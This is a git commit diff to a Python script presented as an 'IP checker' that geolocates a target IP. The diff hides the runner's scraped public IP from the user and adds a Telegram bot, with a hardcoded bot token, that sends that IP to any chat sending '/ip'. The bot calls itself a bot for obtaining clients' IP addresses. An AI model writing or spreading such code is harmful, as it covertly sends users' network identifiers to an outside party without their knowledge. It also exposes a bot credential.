30013fd858d9ce60463185accee96bbc03a4d5e0
BazisUa <bereznyak.illya1@gmail.com>
2023-11-11 17:12:19 +0200

    I created an ip checker.

--- ip_chek.py
+++ ip_chek.py
@@ -1,13 +1,40 @@
-import requests
 from pyfiglet import Figlet
 import folium
-import bs4, requests
+import bs4
+import requests
+import time
 
 s = requests.get('https://2ip.ua/ru/')
 
 b = bs4.BeautifulSoup(s.text, "html.parser")
 
 a = b.select(" .ipblockgradient .ip")[0].getText()
+
+url = "https://api.telegram.org/bot6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8/"
+
+
+def last_update(r):
+    response = requests.get(r + "getUpdates")
+    response = response.json()
+    result = response['result']
+    total_updates = len(result) - 1
+    return result[total_updates]
+
+
+def get_chat_id(u):
+    chat_id = u['message']['chat']['id']
+    return chat_id
+
+
+def get_message_text(u):
+    text = u['message']['text']
+    return text
+
+
+def send_message(chat, text):
+    p = {'chat_id': chat, 'text': text}
+    response = requests.post(url + 'sendMessage', params=p)
+    return response
 
 
 def get_info_by_ip(ip='127.0.0.1'):
@@ -40,10 +67,35 @@ def get_info_by_ip(ip='127.0.0.1'):
 def main():
     preview_text = Figlet(font='slant')
     print(preview_text.renderText('IP INFO'))
-    print("Your ip:", a)
     ip = input('Please enter a target IP: ')
 
     get_info_by_ip(ip=ip)
+    # print("Bot started")
+    up_id = last_update(url)['update_id']
+    while True:
+        upd = last_update(url)
+        if up_id == upd['update_id']:
+            # print("New message!")
+
+            if get_message_text(upd).lower() == "/ip":
+                send_message(get_chat_id(upd), f"IP клієнта: {a}")
+
+            elif get_message_text(upd).lower() == "/start":
+                send_message(get_chat_id(upd),
+                             "Я Бот для отримання IP адресів клієнтів")
+
+
+
+            elif get_message_text(upd).lower() == "/help":
+                send_message(get_chat_id(upd),
+                             "Я Бот для отримання IP адресів клієнтів")
+
+            else:
+                send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
+            up_id += 1
+        time.sleep(2)
+
+
 
 
 if __name__ == '__main__':
